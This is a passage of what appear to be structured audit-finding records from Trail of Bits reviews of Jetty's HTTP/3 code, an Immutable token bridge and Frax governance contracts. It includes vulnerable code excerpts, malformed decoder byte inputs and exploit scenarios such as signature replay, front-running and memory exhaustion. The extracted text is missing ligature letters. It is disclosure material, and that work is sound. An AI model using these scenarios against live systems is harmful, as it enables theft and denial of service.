QUIC implementation uses quiche, a QUIC and HTTP/3 library maintained by Cloudare. When the servers SSL certicate is handed o to quiche, the private key is extracted from the existing keystore and written to a temporary plaintext PEM le: protected void doStart () throws Exception { // ...[snip]... char [] keyStorePassword = sslContextFactory.getKeyStorePassword().toCharArray(); String keyManagerPassword = sslContextFactory.getKeyManagerPassword(); SSLKeyPair keyPair = new SSLKeyPair( sslContextFactory.getKeyStoreResource().getPath(), sslContextFactory.getKeyStoreType(), keyStorePassword, alias, keyManagerPassword == null ? keyStorePassword : keyManagerPassword.toCharArray() ); File[] pemFiles = keyPair.export( new File(System.getProperty( \"java.io.tmpdir\" ))); privateKeyFile = pemFiles[ 0 ]; certificateChainFile = pemFiles[ 1 ]; } Figure 21.1: QuicServerConnector.java , lines 154179 Storing the private key in this manner exposes it to increased risk of theft. Although the QuicServerConnector class deletes the private key le upon stopping the server, this deleted le may not be immediately removed from the physical storage medium, exposing the le to potential theft by attackers who can access the raw bytes on the disk. A review of quiche suggests that the librarys API may not support reading a DES-encrypted keyle. If that is true, then remediating this issue would require updates to the underlying quiche library. 71 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker gains read access to a Jetty HTTP/3 servers temporary directory while the server is running. The attacker can retrieve the temporary keyle and read the private key without needing to obtain or guess the encryption key for the original keystore. With this private key in hand, the attacker decrypts and tampers with all TLS communications that use the associated certicate. Recommendations Short term, investigate the quiche librarys API to determine whether it can readily support password-encrypted private keyles. If so, update Jetty to save the private key in a temporary password-protected le and to forward that password to quiche. Alternatively, if password-encrypted private keyles can be supported, have Jetty pass the unencrypted private key directly to quiche as a function argument. Either option would obviate the need to store the key in a plaintext le on the servers lesystem. If quiche does not support either of these changes, open an issue or pull request for quiche to implement a x for this issue. 72 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "22. Repeated code between HPACK and QPACK ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Classes for dealing with n-bit integers and Human coding are implemented both in the jetty-http2-hpack and in jetty-http3-qpack libraries. These classes have very similar functionality but are implemented in two dierent places, sometimes with identical code and other times with dierent implementations. In some cases ( TOB-JETTY-9 ), one implementation has a bug that the other implementation does not have. The codebase would be easier to maintain and keep secure if the implementations were merged. Exploit Scenario A vulnerability is found in the Human encoding implementation, which has identical code in HPACK and QPACK. The vulnerability is xed in one implementation but not the other, leaving one of the implementations vulnerable. Recommendations Short term, merge the two implementations of n-bit integers and Human coding classes. Long term, audit the Jetty codebase for other classes with very similar functionality. 73 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "23. Various exceptions in HpackDecoder.decode and QpackDecoder.decode ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The HpackDecoder and QpackDecoder classes both throw unexpected Java-level exceptions:  HpackDecoder.decode(0x03) throws BufferUnderflowException .  HpackDecoder.decode(0x4800) throws NumberFormatException .  HpackDecoder.decode(0x3fff 2e) throws IllegalArgumentException .  HpackDecoder.decode(0x3fff 81ff ff2e) throws NullPointerException .  HpackDecoder.decode(0xffff ffff f8ff ffff ffff ffff ffff ffff ffff ffff ffff ffff 0202 0000) throws ArrayIndexOutOfBoundsException .  QpackDecoder.decode(..., 0x81, ...) throws IndexOutOfBoundsException .  QpackDecoder.decode(..., 0xfff8 ffff f75b, ...) throws ArithmeticException . For both HPACK and QPACK, these exceptions appear to be caught higher up in the call chain by catch (Throwable x) statements every time the decode functions are called. However, catching them within decode and throwing a Jetty-level exception within the catch statement would result in cleaner, more robust code. Exploit Scenario Jetty developers refactor the codebase, moving function calls around and introducing a new point in the code where HpackDecoder.decode is called. Assuming that decode will throw only org.jetty errors, they forget to wrap this call in a catch (Throwable x) statement. This results in a DoS vulnerability. Recommendations Short term, document in the code that Java-level exceptions can be thrown. Long term, modify the decode functions so that they throw only Jetty-level exceptions. 74 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "24. Incorrect QPACK encoding when multi-byte characters are used ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Javas string.length() function returns the number of characters in a string, which can be dierent from the number of bytes returned by the string.getBytes() function. However, QPACK encoding methods assume that they return the same number, which could cause incorrect encodings. In EncodableEntry.LiteralEntry , which is used to encode HTTP/3 header elds, the following method is used for encoding: public void encode (ByteBuffer buffer, int base) 214 215 { 216 byte allowIntermediary = 0x00 ; // TODO: this is 0x10 bit, when should this be set? 217 218 219 220 221 222 223 224 String name = getName(); String value = getValue(); // Encode the prefix code and the name. if (_huffman) { buffer.put(( byte )( 0x28 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , HuffmanEncoder.octetsNeeded(name)); 225 226 227 HuffmanEncoder.encode(buffer, name); buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); 228 229 230 231 232 HuffmanEncoder.encode(buffer, value); } else { // TODO: What charset should we be using? (this applies to the instruction generators as well). 233 234 235 236 237 238 buffer.put(( byte )( 0x20 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , name.length()); buffer.put(name.getBytes()); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); 75 OSTIF Eclipse: Jetty Security Assessment 239 240 } } Figure 24.1: EncodableEntry.java , lines 214240 Note in particular lines 232238, which are used to encode literal (non-Human-coded) names and values. The value returned by name.length() is added to the bytestring, followed by the value returned by name.getBytes() . Then, the value returned by value.length() is added to the bytestring, followed by the value returned by value.getBytes() . When this bytestring is decoded, the decoder will read the name length eld and then read that many bytes as the name. If multibyte characters were used in the name eld, the decoder will read too few bytes. The rest of the bytestring will also be decoded incorrectly, since the decoder will continue reading at the wrong point in the bytestring. The same issue occurs if multibyte characters were used in the value eld. The same issue appears in EncodableEntry.ReferencedNameEntry.encode : if (_huffman) 164 // Encode the value. 165 String value = getValue(); 166 167 { 168 169 170 171 } 172 173 { 174 175 176 177 } else buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); HuffmanEncoder.encode(buffer, value); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); Figure 24.2: EncodableEntry.java , lines 164177 If value has multibyte characters, it will be incorrectly encoded in lines 174176. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server attempts to add the Set-Cookie header, setting a cookie value to a UTF-8-encoded string that contains multibyte characters. This causes an incorrect cookie value to be set and the rest of the headers in this message to be parsed incorrectly. 76 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, have the encode function in both EncodableEntry.LiteralEntry and EncodableEntry.ReferencedNameEntry encode the length of the string using string.getBytes() rather than string.length() . 77 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "25. No limits on maximum capacity in QPACK decoder ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "In QPACK, an encoder can set the dynamic table capacity of the decoder using a Set Dynamic Table Capacity instruction. The HTTP/3 specication requires that the capacity be no larger than the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit chosen by the decoder. However, nowhere in the QPACK code is this limit checked for. This means that the encoder can choose whatever capacity it wants (up to Javas maximum integer value), allowing it to take up large amounts of space on the decoders memory. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server supporting QPACK is running. An attacker opens a connection to the server. He sends a Set Dynamic Table Capacity instruction, setting the dynamic table capacity to Javas maximum integer value, 2 31-1 (2.1 GB). He then repeatedly enters very large values into the servers dynamic table using an Insert with Literal Name instruction until the full 2.1 GB capacity is taken up. The attacker repeats this using multiple connections until the server runs out of memory and crashes. Recommendations Short term, enforce the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit on the capacity. Long term, audit Jettys implementation of QPACK and other protocols to ensure that Jetty enforces limits as required by the standards. 78 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "1. Initialization functions vulnerable to front-running ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf", "body": "Several implementation contracts have initialization functions that can be front-run, which would allow an attacker to incorrectly initialize the contracts. Due to the use of the delegatecall proxy pattern, the RootERC20Predicate and RootERC20PredicateFlowRate contracts (as well as other upgradeable contracts that are not in scope) cannot be initialized with a constructor, so they have initialize functions: function initialize ( address newStateSender , address newExitHelper , address newChildERC20Predicate , address newChildTokenTemplate , address nativeTokenRootAddress ) external virtual initializer { __RootERC20Predicate_init( newStateSender, newExitHelper, newChildERC20Predicate, newChildTokenTemplate, nativeTokenRootAddress ); } Figure 1.1: Front-runnable initialize function ( RootERC20Predicate.sol ) function initialize ( address superAdmin , address pauseAdmin , address unpauseAdmin , address rateAdmin , address newStateSender , address newExitHelper , address newChildERC20Predicate , address newChildTokenTemplate , address nativeTokenRootAddress ) external initializer { __RootERC20Predicate_init( newStateSender, newExitHelper, newChildERC20Predicate, newChildTokenTemplate, nativeTokenRootAddress ); __Pausable_init(); __FlowRateWithdrawalQueue_init(); _setupRole(DEFAULT_ADMIN_ROLE, superAdmin); _setupRole(PAUSER_ADMIN_ROLE, pauseAdmin); _setupRole(UNPAUSER_ADMIN_ROLE, unpauseAdmin); _setupRole(RATE_CONTROL_ROLE, rateAdmin); } Figure 1.2: Front-runnable initialize function ( RootERC20PredicateFlowRate.sol ) An attacker could front-run these functions and initialize the contracts with malicious values. The documentation provided by the Immutable team indicates that they are aware of this issue and how to mitigate it upon deployment of the proxy or when upgrading the implementation. However, there do not appear to be any deployment scripts to demonstrate that this will be correctly done in practice, and the codebases tests do not cover upgradeability. Exploit Scenario Bob deploys the RootERC20Predicate contract. Eve deploys an upgradeable version of the ExitHelper contract and front-runs the RootERC20Predicate initialization, passing her contracts address as the exitHelper argument. Due to a lack of post-deployment checks, this issue goes unnoticed and the protocol functions as intended for some time, drawing in a large amount of deposits. Eve then upgrades the ExitHelper contract to allow her to arbitrarily call the onL2StateReceive function of the RootERC20Predicate contract, draining all assets from the bridge. Recommendations Short term, either use a factory pattern that will prevent front-running the initialization, or ensure that the deployment scripts have robust protections against front-running attacks. Long term, carefully review the Solidity documentation , especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Lack of lower and upper bounds for system parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf", "body": "The lack of lower and upper bound checks when setting important system parameters could lead to a temporary denial of service, allow users to complete their withdrawals prematurely, or otherwise hinder the expected performance of the system. The setWithdrawalDelay function of the RootERC20PredicateFlowRate contract can be used by the rate control role to set the amount of time that a user needs to wait before they can withdraw their assets from the root chain of the bridge. // RootERC20PredicateFlowRate.sol function setWithdrawalDelay ( uint256 delay ) external onlyRole(RATE_CONTROL_ROLE) { _setWithdrawalDelay(delay); } // FlowRateWithdrawalQueue.sol function _setWithdrawalDelay ( uint256 delay ) internal { withdrawalDelay = delay; emit WithdrawalDelayUpdated(delay); } Figure 2.1: The setter functions for the withdrawalDelay state variable ( RootERC20PredicateFlowRate.sol and FlowRateWithdrawalQueue.sol ) The withdrawalDelay variable value is applied to all currently pending withdrawals in the system, as shown in the highlighted lines of gure 2.2. function _processWithdrawal ( address receiver , uint256 index ) internal returns ( address withdrawer , address token , uint256 amount ) { // ... // Note: Add the withdrawal delay here, and not when enqueuing to allow changes // to withdrawal delay to have effect on in progress withdrawals. uint256 withdrawalTime = withdrawal.timestamp + withdrawalDelay; // slither-disable-next-line timestamp if ( block.timestamp < withdrawalTime) { // solhint-disable-next-line not-rely-on-time revert WithdrawalRequestTooEarly( block.timestamp , withdrawalTime); } // ... } Figure 2.2: The function completes a withdrawal from the withdrawal queue if the withdrawalTime has passed. ( FlowRateWithdrawalQueue.sol ) However, the setWithdrawalDelay function does not contain any validation on the delay input parameter. If the input parameter is set to zero, users can skip the withdrawal queue and immediately withdraw their assets. Conversely, if this variable is set to a very high value, it could prevent users from withdrawing their assets for as long as this variable is not updated. The setRateControlThreshold allows the rate control role to set important token parameters that are used to limit the amount of tokens that can be withdrawn at once, or in a certain time period, in order to mitigate the risk of a large amount of tokens being bridged after an exploit. // RootERC20PredicateFlowRate.sol function setRateControlThreshold ( address token , uint256 capacity , uint256 refillRate , uint256 largeTransferThreshold ) external onlyRole(RATE_CONTROL_ROLE) { _setFlowRateThreshold(token, capacity, refillRate); largeTransferThresholds[token] = largeTransferThreshold; } // FlowRateDetection.sol function _setFlowRateThreshold ( address token , uint256 capacity , uint256 refillRate ) internal { if (token == address ( 0 )) { revert InvalidToken(); } if (capacity == 0 ) { revert InvalidCapacity(); } if (refillRate == 0 ) { revert InvalidRefillRate(); } Bucket storage bucket = flowRateBuckets[token]; if (bucket.capacity == 0 ) { bucket.depth = capacity; } bucket.capacity = capacity; bucket.refillRate = refillRate; } Figure 2.3: The function sets the system parameters to limit withdrawals of a specic token. ( RootERC20PredicateFlowRate.sol and FlowRateDetection.sol ) However, because the _setFlowRateThreshold function of the FlowRateDetection contract is missing upper bounds on the input parameters, these values could be set to an incorrect or very high value. This could potentially allow users to withdraw large amounts of tokens at once, without triggering the withdrawal queue. Exploit Scenario Alice attempts to update the withdrawalDelay state variable from 24 to 48 hours. However, she mistakenly sets the variable to 0 . Eve uses this setting to skip the withdrawal queue and immediately withdraws her assets. Recommendations Short term, determine reasonable lower and upper bounds for the setWithdrawalDelay and setRateControlThreshold functions, and add the necessary validation to those functions. Long term, carefully document which system parameters are congurable and ensure they have adequate upper and lower bound checks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. RootERC20Predicate is incompatible with nonstandard ERC-20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf", "body": "The deposit and depositTo functions of the RootERC20Predicate contract are incompatible with nonstandard ERC-20 tokens, such as tokens that take a fee on transfer. The RootERC20Predicate contract allows users to deposit arbitrary tokens into the root chain of the bridge and mint the corresponding token on the child chain of the bridge. Users can deposit their tokens by approving the bridge for the required amount and then calling the deposit or depositTo function of the contract. These functions will call the internal _depositERC20 function, which will perform a check to ensure the token balance of the contract is exactly equal to the balance of the contract before the deposit, plus the amount of tokens that are being deposited. function _depositERC20 (IERC20Metadata rootToken, address receiver , uint256 amount ) private { uint256 expectedBalance = rootToken.balanceOf( address ( this )) + amount; _deposit(rootToken, receiver, amount); // invariant check to ensure that the root token balance has increased by the amount deposited // slither-disable-next-line incorrect-equality require ((rootToken.balanceOf( address ( this )) == expectedBalance), \"RootERC20Predicate: UNEXPECTED_BALANCE\" ); } Figure 3.1: Internal function used to deposit ERC-20 tokens to the bridge ( RootERC20Predicate.sol ) However, some nonstandard ERC-20 tokens will take a percentage of the transferred amount as a fee. Due to this, the require statement highlighted in gure 3.1 will always fail, preventing users from depositing such tokens. Recommendations Short term, clearly document that nonstandard ERC-20 tokens are not supported by the protocol. If the team determines that they want to support nonstandard ERC-20 implementations, additional logic should be added into the _deposit function to determine the actual token amount received by the contract. In this case, reentrancy protection may be needed to mitigate the risks of ERC-777 and similar tokens that implement callbacks whenever tokens are sent or received. Long term, be aware of the idiosyncrasies of ERC-20 implementations. This standard has a history of misuses and issues. References   Incident with non-standard ERC20 deationary tokens d-xo/weird-erc20", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Lack of event generation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf", "body": "Multiple critical operations do not emit events. This creates uncertainty among users interacting with the system. The setRateControlThresholds function in the RootERC20PredicateFlowRate contract does not emit an event when it updates the largeTransferThresholds critical storage variable for a token (gure 4.1). However, having an event emitted to reect such a change in the critical storage variable may allow other system and o-chain components to detect suspicious behavior in the system. Events generated during contract execution aid in monitoring, baselining behavior, and detecting suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and malfunctioning contracts and attacks could go undetected. function setRateControlThreshold ( 1 address token , 2 uint256 capacity , 3 uint256 refillRate , 4 5 uint256 largeTransferThreshold 6 ) external onlyRole(RATE_CONTROL_ROLE) { 7 8 9 } _setFlowRateThreshold(token, capacity, refillRate); largeTransferThresholds[token] = largeTransferThreshold; Figure 4.1: The setRateControlThreshold function ( RootERC20PredicateFlowRate.sol #L214-L222 ) In addition to the above function, the following function should also emit events:  The setAllowedZone function in seaport/contracts/ImmutableSeaport.sol Recommendations Short term, add events for all functions that change state to aid in better monitoring and alerting. Long term, ensure that all state-changing operations are always accompanied by events. In addition, use static analysis tools such as Slither to help prevent such issues in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Withdrawal queue can be forcibly activated to hinder bridge operation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-immutable-securityreview.pdf", "body": "The withdrawal queue can be forcibly activated to impede the proper operation of the bridge. The RootERC20PredicateFlowRate contract implements a withdrawal queue to more easily detect and stop large withdrawals from passing through the bridge (e.g., bridging illegitimate funds from an exploit). A transaction can enter the withdrawal queue in four ways: 1. If a tokens ow rate has not been congured by the rate control admin 2. If the withdrawal amount is larger than or equal to the large transfer threshold for that token 3. If, during a predened period, the total withdrawals of that token are larger than the dened token capacity 4. If the rate controller manually activates the withdrawal queue by using the activateWithdrawalQueue function In cases 3 and 4 above, the withdrawal queue becomes active for all tokens, not just the individual transfers. Once the withdrawal queue is active, all withdrawals from the bridge must wait a specied time before the withdrawal can be nalized. As a result, a malicious actor could withdraw a large amount of tokens to forcibly activate the withdrawal queue and hinder the expected operation of the bridge. Exploit Scenario 1 Eve observes Alice initiating a transfer to bridge her tokens back to the mainnet. Eve also initiates a transfer, or a series of transfers to avoid exceeding the per-transaction limit, of sucient tokens to exceed the expected ow rate. With Alice unaware she is being targeted for grieng, Eve can execute her withdrawal on the root chain rst, cause Alices withdrawal to be pushed into the withdrawal queue, and activate the queue for every other bridge user. Exploit Scenario 2 Mallory has identied an exploit on the child chain or in the bridge itself, but because of the withdrawal queue, it is not feasible to exltrate the funds quickly enough without risking getting caught. Mallory identies tokens with small ow rate limits relative to their price and repeatedly triggers the withdrawal queue for the bridge, degrading the user experience until Immutable disables the withdrawal queue. Mallory takes advantage of this window of time to carry out her exploit, bridge the funds, and move them into a mixer. Recommendations Short term, explore the feasibility of withdrawal queues on a per-token basis instead of having only a global queue. Be aware that if the ow rates are set low enough, an attacker could feasibly use them to grief all bridge users. Long term, develop processes for regularly reviewing the conguration of the various token buckets. Fluctuating token values may unexpectedly make this type of grieng more feasible. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Race condition in FraxGovernorOmega target validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The FraxGovernorOmega contract is intended for carrying out day-to-day operations and less sensitive proposals that do not adjust system governance parameters. Proposals directly aecting system governance are managed in the FraxGovernorAlpha contract, which has a much higher quorum requirement (40%, compared with FraxGovernorOmega s 4% quorum requirement). When a new proposal is submitted to the FraxGovernorOmega contract through the propose or addTransaction function, the target address of the proposal is checked to prevent proposals from interacting with sensitive functions in allowlisted safes outside of the higher quorum ow (gure 1.1). However, if a proposal to allowlist a new safe is pending in FraxGovernorAlpha , and another proposal that interacts with the pending safe is preemptively submitted through FraxGovernorOmega.propose , the proposal would pass this check, as the new safe would not yet have been added to the allowlist. /// @notice The ```propose``` function is similar to OpenZeppelin's ```propose()``` with minor changes /// @dev Changes include: Forbidding targets that are allowlisted Gnosis Safes /// @return proposalId Proposal ID function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } Figure 1.1: The target validation logic in the FraxGovernorOmega contracts propose function This issue provides a short window of time in which a proposal to update governance parameters that is submitted through FraxGovernorOmega could pass with the contracts 4% quorum, rather than needing to go through FraxGovernorAlpha and its 40% quorum, as intended. Such an exploit would also require cooperation from the safe owners to execute the approved transaction. As the vast majority of operations in the FraxGovernorOmega process will be optimistic proposals, the community may not monitor the contract as comprehensively as FraxGovernorAlpha , and a minority group of coordinated veFXS holders could take advantage of this loophole. Exploit Scenario A FraxGovernorAlpha proposal to add a new Gnosis Safe to the allowlist is being voted on. In anticipation of the proposals approval, the new safe owner prepares and signs a transaction on this new safe for a contentious or previously vetoed action. Alice, a veFXS holder, uses FraxGovernorOmega.propose to initiate a proposal to approve the hash of this transaction in the new safe. Alice coordinates with enough other interested veFXS holders to reach the required quorum on the proposal. The proposal passes, and the new safe owner is able to update governance parameters without the consensus of the community. Recommendations Short term, add additional validation to the end of the proposal lifecycle to detect whether the target has become an allowlisted safe. Long term, when designing new functionality, consider how this type of time-of-check to time-of-use mismatch could aect the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Vulnerable project dependency ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Although dependency scans did not uncover a direct threat to the project codebase, npm audit identied a dependency with a known vulnerability, the yaml library. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the project system as a whole. The output detailing the identied issue is provided below: Dependency Version ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "3. Replay protection missing in castVoteWithReasonAndParamsBySig ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The castVoteWithReasonAndParamsBySig function does not include a voter nonce, so transactions involving the function can be replayed by anyone. Votes can be cast through signatures by encoding the vote counts in the params argument. function castVoteWithReasonAndParamsBySig ( uint256 proposalId , uint8 support , string calldata reason, bytes memory params, uint8 v , bytes32 r , bytes32 s ) public virtual override returns ( uint256 ) { address voter = ECDSA.recover( _hashTypedDataV4( keccak256 ( abi.encode( EXTENDED_BALLOT_TYPEHASH, proposalId, support, keccak256 ( bytes (reason)), keccak256 (params) ) ) ), v, r, s ); return _castVote(proposalId, voter, support, reason, params); } Figure 3.1: The castVoteWithReasonAndParamsBySig function does not include a nonce. ( Governor.sol#L508-L535 ) The castVoteWithReasonAndParamsBySig function calls the _countVoteFractional function in the GovernorCountingFractional contract, which keeps track of partial votes. Unlike _countVoteNominal , _countVoteFractional can be called multiple times, as long as the voters total voting weight is not exceeded. Exploit Scenario Alice has 100,000 voting power. She signs a message, and a relayer calls castVoteWithReasonAndParamsBySig to vote for one yes and one abstain. Eve sees this transaction on-chain and replays it for the remainder of Alices voting power, casting votes that Alice did not intend to. Recommendations Short term, either include a voter nonce for replay protection or modify the _countVoteFractional function to require that _proposalVotersWeightCast[proposalId][account] equals 0 , which would allow votes to be cast only once. Long term, increase the test coverage to include cases of signature replay.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "4. Ability to lock any users tokens using deposit_for ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The deposit_for function can be used to lock anyone's tokens given sucient token approvals and an existing lock. @external @nonreentrant ( 'lock' ) def deposit_for (_addr: address, _value: uint256): \"\"\" @notice Deposit `_value` tokens for `_addr` and add to the lock @dev Anyone (even a smart contract) can deposit for someone else, but cannot extend their locktime and deposit for a brand new user @param _addr User's wallet address @param _value Amount to add to user's lock \"\"\" _locked: LockedBalance = self .locked[_addr] assert _value > 0 # dev: need non-zero value assert _locked.amount > 0 , \"No existing lock found\" assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\" self ._deposit_for(_addr, _value, 0 , self .locked[_addr], DEPOSIT_FOR_TYPE) Figure 4.1: The deposit_for function can be used to lock anyones tokens. ( test/veFXS.vy#L458-L474 ) The same issue is present in the veCRV contract for the CRV token, so it may be known or intentional. Exploit Scenario Alice gives unlimited FXS token approval to the veFXS contract. Alice wants to lock 1 FXS for 4 years. Bob sees that Alice has 100,000 FXS and locks all of the tokens for her. Alice is no longer able to access her 100,000 FXS. Recommendations Short term, make users aware of the issue in the existing token contract. Only present the user with exact approval limits when locking FXS.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. The relay function can be used to call critical safe functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The relay function of the FraxGovernorOmega contract supports arbitrary calls to arbitrary targets and can be leveraged in a proposal to call sensitive functions on the Gnosis Safe. function relay ( address target , uint256 value , bytes calldata data) external payable virtual onlyGovernance { ( bool success , bytes memory returndata) = target.call{value: value}(data); Address.verifyCallResult(success, returndata, \"Governor: relay reverted without message\" ); } Figure 5.1: The relay function inherited from Governor.sol The FraxGovernorOmega contract checks proposed transactions to ensure they do not target critical functions on the Gnosis Safe contract outside of the more restrictive FraxGovernorAlpha ow. function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } proposalId = _propose({ targets: targets, values: values, calldatas: calldatas, description: description }); } Figure 5.2: The propose function of FraxGovernorOmega.sol A malicious user can hide a call to the Gnosis Safe by wrapping it in a call to the relay function. There are no further restrictions on the target contract argument, which means the relay function can be called with calldata that targets the Gnosis Safe contract. Exploit Scenario Alice, a veFXS holder, submits a transaction to the propose function. The targets array contains the FraxGovernorOmega address, and the corresponding calldatas array contains an encoded call to its relay function. The encoded call to the relay function has a target address of an allowlisted Gnosis Safe and an encoded call to its approveHash function with a payload of a malicious transaction hash. Due to the low quorum threshold on FraxGovernorOmega and the shorter voting period, Alice is able to push her malicious transaction through, and it is approved by the safe even though it should not have been. Recommendations Short term, add a check to the relay function that prevents it from targeting addresses of allowlisted safes. Long term, carefully examine all cases of user-provided inputs, especially where arbitrary targets and calldata can be submitted, and expand the unit tests to account for edge cases specic to the wider system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "6. Votes can be delegated to contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Votes can be delegated to smart contracts. This behavior contrasts with the fact that FXS tokens can be locked only in whitelisted contracts. Allowing votes to be delegated to smart contracts could lead to unexpected behavior. By default, smart contracts are unable to gain voting power; to gain voting power, they need to be explicitly whitelisted by the Frax Finance team in the veFXS contract. @internal def assert_not_contract (addr: address): \"\"\" @notice Check if the call is from a whitelisted smart contract, revert if not @param addr Address to be checked \"\"\" if addr != tx.origin: checker: address = self .smart_wallet_checker if checker != ZERO_ADDRESS: if SmartWalletChecker(checker).check(addr): return raise \"Smart contract depositors not allowed\" Figure 6.1: The contract check in veFXS.vy This is the intended design of the voting escrow contract, as allowing smart contracts to vote would enable wrapped tokens and bribes. The VeFxsVotingDelegation contract enables users to delegate their voting power to other addresses, but it does not contain a check for smart contracts. This means that smart contracts can now hold voting power, and the team is unable to disallow this. function _delegate ( address delegator , address delegatee ) internal { // Revert if delegating to self with address(0), should be address(delegator) if (delegatee == address ( 0 )) revert IVeFxsVotingDelegation.IncorrectSelfDelegation(); IVeFxsVotingDelegation.Delegation memory previousDelegation = $delegations[delegator]; // This ensures that checkpoints take effect at the next epoch uint256 checkpointTimestamp = (( block.timestamp / 1 days) * 1 days) + 1 days; IVeFxsVotingDelegation.NormalizedVeFxsLockInfo memory normalizedDelegatorVeFxsLockInfo = _getNormalizedVeFxsLockInfo({ delegator: delegator, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerFromPreviousDelegate({ previousDelegation: previousDelegation, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerToNewDelegate({ newDelegate: delegatee, delegatorVeFxsLockInfo: normalizedDelegatorVeFxsLockInfo, checkpointTimestamp: checkpointTimestamp }); // ... } Figure 6.2: The _delegate function in VeFxsVotingDelegation.sol Exploit Scenario Eve sets up a contract that accepts delegated votes in exchange for rewards. The contract ends up owning a majority of the FXS voting power. Recommendations Short term, consider whether smart contracts should be allowed to hold voting power. If so, document this fact; if not, add a check to the VeFxsVotingDelegation contract to ensure that addresses receiving delegated voting power are not smart contracts . Long term, when implementing new features, consider the implications of adding them to ensure that they do not lift constraints that were placed beforehand.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Lack of public documentation regarding voting power expiry ", "html_url": 